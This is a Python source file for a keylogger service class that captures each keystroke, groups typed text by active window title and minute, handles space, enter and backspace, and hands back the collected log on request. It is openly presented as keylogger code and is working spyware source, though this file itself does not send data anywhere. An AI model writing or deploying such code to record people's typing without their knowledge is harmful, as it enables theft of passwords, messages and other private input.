from Interfaces import IKeyLogger
from datetime import datetime
import pygetwindow as gw

class KeyLoggerService(IKeyLogger):

    def __init__(self):
        self.data = {}
        self.running = False

    def get_logged_keys(self) -> dict:
        data = self.data.copy()
        self.data.clear()
        return data

    def start_logging(self) -> None:
        self.running = True

    def stop_logging(self) -> None:
        self.running = False

    def get_keyword(self, key):
        if not self.running:
            return

        window = KeyLoggerService._get_window()
        if window not in self.data:
            self.data[window] = {}
        time = KeyLoggerService._get_time()
        if time not in self.data[window]:
            self.data[window][time] = ""

        try:
            key_str = key.char if hasattr(key, 'char') and key.char is not None else str(key)

            if key_str.startswith("Key."):

                if key_str == "Key.space":
                    self.data[window][time] += " "
                elif key_str == "Key.enter":
                    self.data[window][time] += "\n"
                elif key_str == "Key.backspace" and len(self.data[window][time]) >= 1:
                    self.data[window][time] = self.data[window][time][:-1]
            else:
                self.data[window][time] += key_str
        except Exception as e:
            print(f"Error processing key: {e}")

    @staticmethod
    def _get_time():
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    @staticmethod
    def _get_window():
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"

